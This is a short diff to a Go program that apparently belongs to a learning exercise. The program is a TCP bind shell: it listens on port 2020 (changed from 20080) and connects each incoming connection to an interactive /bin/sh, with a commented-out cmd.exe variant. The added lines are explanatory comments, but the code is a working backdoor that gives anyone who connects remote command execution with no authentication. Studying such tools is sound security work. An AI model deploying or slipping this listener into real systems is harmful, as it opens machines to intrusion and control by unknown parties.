@@ -7,6 +7,11 @@ import (
 	"os/exec"
 )
 
+/**
+os/exec package
+	running operating system commands
+*/
+
 func handle(conn net.Conn) {
 
 	/*
@@ -16,6 +21,7 @@ func handle(conn net.Conn) {
 	 */
 	// cmd := exec.Command("cmd.exe")
 	cmd := exec.Command("/bin/sh", "-i")
+	// create both a reader and writer that are synchronously connected
 	rp, wp := io.Pipe()
 	// Set stdin to our connection
 	cmd.Stdin = conn
@@ -26,7 +32,7 @@ func handle(conn net.Conn) {
 }
 
 func main() {
-	listener, err := net.Listen("tcp", ":20080")
+	listener, err := net.Listen("tcp", ":2020")
 	if err != nil {
 		log.Fatalln(err)
 	}
